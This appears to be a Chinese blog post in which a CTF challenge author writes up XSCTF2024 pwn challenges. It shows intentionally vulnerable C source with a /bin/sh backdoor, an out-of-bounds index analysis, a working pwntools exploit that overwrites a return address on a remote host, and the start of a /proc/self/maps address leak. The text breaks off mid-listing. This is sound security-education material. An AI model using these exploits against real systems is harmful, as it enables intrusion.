@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这次出了三道题（一道新生专属难度，两道中等难度） 这次没有出困难题，但是中等题其实也足够困难了。 结合其他师傅的出题，感觉上比较缺少过渡的出题，造成现象旱的旱死，涝的涝死（qy师傅出的不错，也很有意思） 【新生专属】c_master  :::info题目描述 请使用简单的C语句对程序进行getshell吧！ ::: 下面是题目源码 123456789101112131415161718192021">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSCTF2024pwn出题笔记&amp;wp">
+<meta property="og:url" content="http://example.com/2024/11/09/XSCTF2024pwn%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0-wp/index.html">
+<meta property="og:site_name" content="xswlhhh的黄金屋">
+<meta property="og:description" content="这次出了三道题（一道新生专属难度，两道中等难度） 这次没有出困难题，但是中等题其实也足够困难了。 结合其他师傅的出题，感觉上比较缺少过渡的出题，造成现象旱的旱死，涝的涝死（qy师傅出的不错，也很有意思） 【新生专属】c_master  :::info题目描述 请使用简单的C语句对程序进行getshell吧！ ::: 下面是题目源码 123456789101112131415161718192021">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776296118-95d9faa0-57bb-40d2-aed4-5d182c6d5ccf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776497990-1d913b9e-0a4c-4675-a76b-5c9a679dfadf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776518870-529b70bb-2aea-48cb-bebf-ab97d23e06a6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776561485-267a2b36-cd18-48fa-978d-eeeb077c6303.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776831632-ff9f217c-3214-4a36-b165-56163ec00b16.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776853694-57a1d0e9-4fd7-4af7-bda0-a02a09adbb40.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730777185430-4c928bcd-0431-4de1-8f7b-85745f13077f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730778726491-ca099a5d-f39e-4970-8160-a9df5ad2867f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730780048067-d4d36499-fba8-492f-a9b4-ae20068a788d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730780204448-5e423477-483b-4c8c-8804-08947db56a99.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730784652575-2a9b6bd4-fae5-417d-a4a0-02d60624d70a.png">
+<meta property="article:published_time" content="2024-11-09T14:19:57.000Z">
+<meta property="article:modified_time" content="2024-11-09T14:22:48.349Z">
+<meta property="article:author" content="xswlhhh">
+<meta property="article:tag" content="ctfwp">
+<meta property="article:tag" content="2024wp">
+<meta property="article:tag" content="出题笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776296118-95d9faa0-57bb-40d2-aed4-5d182c6d5ccf.png">
+
+<link rel="canonical" href="http://example.com/2024/11/09/XSCTF2024pwn%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0-wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>XSCTF2024pwn出题笔记&wp | xswlhhh的黄金屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xswlhhh的黄金屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/archives" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/09/XSCTF2024pwn%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/myavatar.jpg">
+      <meta itemprop="name" content="xswlhhh">
+      <meta itemprop="description" content="用最少的时间做无关的事，用最多的时间做紧要的事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xswlhhh的黄金屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XSCTF2024pwn出题笔记&wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-11-09 22:19:57 / 修改时间：22:22:48" itemprop="dateCreated datePublished" datetime="2024-11-09T22:19:57+08:00">2024-11-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfwp/" itemprop="url" rel="index"><span itemprop="name">ctfwp</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>26k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>24 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这次出了三道题（一道新生专属难度，两道中等难度）</p>
+<p>这次没有出困难题，但是中等题其实也足够困难了。</p>
+<p>结合其他师傅的出题，感觉上比较缺少过渡的出题，造成现象旱的旱死，涝的涝死（qy师傅出的不错，也很有意思）</p>
+<h1 id="eke1j">【新生专属】c_master</h1>
+
+<p>:::info<br>题目描述</p>
+<p><font style="color:rgb(213, 215, 215);background-color:rgb(29, 30, 30);">请使用简单的C语句对程序进行getshell吧！</font></p>
+<p>:::</p>
+<p>下面是题目源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>   </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">return</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> base[<span class="number">8</span>];</span><br><span class="line">    <span class="type">int</span> baseidx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>* <span class="built_in">string</span>=<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">string</span>,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try to write a C getshell program with my code!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read(0,base,0x8);&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write(1,base,0x8);&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;base+=8;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;base-=8;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;return 0;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%128s&quot;</span>,<span class="built_in">string</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;read(0,base,0x8);&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>,&amp;base[baseidx],<span class="number">0x8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;write(1,base,0x8);&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">            write(<span class="number">1</span>,&amp;base[baseidx],<span class="number">0x8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;base+=8;&quot;</span>))&#123;</span><br><span class="line">            baseidx+=<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;base-=8;&quot;</span>))&#123;</span><br><span class="line">            baseidx-=<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;return 0;&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;No such code...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc  xxx.c -no-pie -o xxx</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="KKWD0">0x1 逆向分析</h2>
+
+<p>checksec查看，没开pie保护，elf地址对我们是透明的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776296118-95d9faa0-57bb-40d2-aed4-5d182c6d5ccf.png"></p>
+<p>拖进IDA分析，看看main函数干了什么？</p>
+<p>首先申请了一个0x400的堆块，然后scanf读取输入写到堆上。</p>
+<p>然后调用strcmp比较输入的字符串和目标字符串。</p>
+<p>如代码所示，read和write都是针对（base~base+0x7）这一块内存进行读写操作。</p>
+<p>所以我们得看看base在哪里，这里的base就是我们的v6[v4]</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776497990-1d913b9e-0a4c-4675-a76b-5c9a679dfadf.png"></p>
+<p>注意到base+&#x3D;8是 v4+&#x3D;8，v4是索引</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776518870-529b70bb-2aea-48cb-bebf-ab97d23e06a6.png"></p>
+<p>v6就是base，索引没做限制，这就是数组溢出。</p>
+<p>base到ret的距离是v10到return_address的距离 也就是0x10+0x8&#x3D;0x18，所以只需要让v4移动三次。</p>
+<p>栈底是高地址，所以我们得让v4+&#x3D;8进行三次操作；</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776561485-267a2b36-cd18-48fa-978d-eeeb077c6303.png"></p>
+<p>此处我们直接覆盖ret返回地址，只要不对canary进行改写，就不会触发canary保护。</p>
+<p>如果直接返回backdoor函数有栈平衡问题</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776831632-ff9f217c-3214-4a36-b165-56163ec00b16.png"></p>
+<p>只需要跳过push rbp指令即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730776853694-57a1d0e9-4fd7-4af7-bda0-a02a09adbb40.png"></p>
+<h2 id="PrugN">0x2 思路总结</h2>
+
+<p>通过数组溢出，覆盖ret为backdoor地址（0x4012BB ），但是有栈平衡问题，需要跳过一个push指令，所以覆盖为0x4012C0。</p>
+<h2 id="eP23o">0x3 exp</h2>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./c_master&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;43.248.97.213&quot;</span>,<span class="number">30219</span>)<span class="comment">#019843.248.97.213:</span></span><br><span class="line">system=<span class="number">0x4012c0</span></span><br><span class="line">p.sendline(<span class="string">&quot;base+=8;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;base+=8;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;base+=8;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;write(1,base,0x8);&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;read(0,base,0x8);&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p64(system))</span><br><span class="line">p.sendline(<span class="string">&quot;return 0;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="vB3fp">Wahahabox</h1>
+
+<p>题目描述：</p>
+<h2 id="Pf3f5">0X1 逆向分析</h2>
+
+<p>check一下二进制程序，发现没开canary，但是开了pie。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730777185430-4c928bcd-0431-4de1-8f7b-85745f13077f.png"></p>
+<p>拖进IDA进行逆向</p>
+<p>main函数如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;If you want to open the box, what do you want to say to Wahaha?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%31s&quot;</span>, buf);</span><br><span class="line">  gift(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to open&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们先计算buf到ret的距离，计算得0x20+0x8</p>
+<p>所以第一个scanf(“%31s”)；我们是无法覆盖ret的，第二个read(0,bu,0x40)；能够覆盖ret，但是只能构造一个p64(pop_rdi )+p64 (数据) + p64(返回地址)的ROP链。</p>
+<p>然后跟进gift函数，看看能给什么信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">gift</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">2060</span>]; <span class="comment">// [rsp+10h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+81Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s a secret :)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(a1, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open box fail :(&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wahaha left you the keys&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  read(fd, s, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, s, <span class="number">0x800</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里open会根据我们字符串去打开一个文件（第二个参数决定以只读形式打开），而且如果我们字符串中有flag这个子字符串（可以去查找strstr函数的功能）就会退出程序。</p>
+<p>然后给了很大的栈空间，来读取文件的内容并输出。</p>
+<p>其实看到这里了解相关知识点的人就能想到利用&#x2F;proc&#x2F;self&#x2F;maps这个文件去泄露 <strong>程序相关的映射地址</strong>了。</p>
+<blockquote>
+<p>放出tips：&#x2F;proc下的文件很有用</p>
+</blockquote>
+<p>其实非常有必要去学习一下这个文件夹。web和pwn其实都有用。</p>
+<p>在本地执行，open打开&#x2F;proc&#x2F;self&#x2F;maps终端输出如下，这里要接收libc.so的地址，这里以接收 <strong>b’55edda100000-55edda121000 rw-p 00000000 00:00 0                          [heap]\n’<strong>中的</strong>子字符串</strong></p>
+<p><strong>“[heap]\n”</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    b<span class="number">&#x27;55</span>edd95bc000<span class="number">-55</span>edd95bd000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95bd000<span class="number">-55</span>edd95be000 r-xp <span class="number">00001000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95be000<span class="number">-55</span>edd95bf000 r--p <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95bf000<span class="number">-55</span>edd95c0000 r--p <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95c0000<span class="number">-55</span>edd95c1000 rw-p <span class="number">00003000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edda100000<span class="number">-55</span>edda121000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [heap]\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30600000<span class="number">-768</span>d30628000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30628000<span class="number">-768</span>d307bd000 r-xp <span class="number">00028000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d307bd000<span class="number">-768</span>d30815000 r--p <span class="number">001b</span>d000 <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30815000<span class="number">-768</span>d30816000 ---p <span 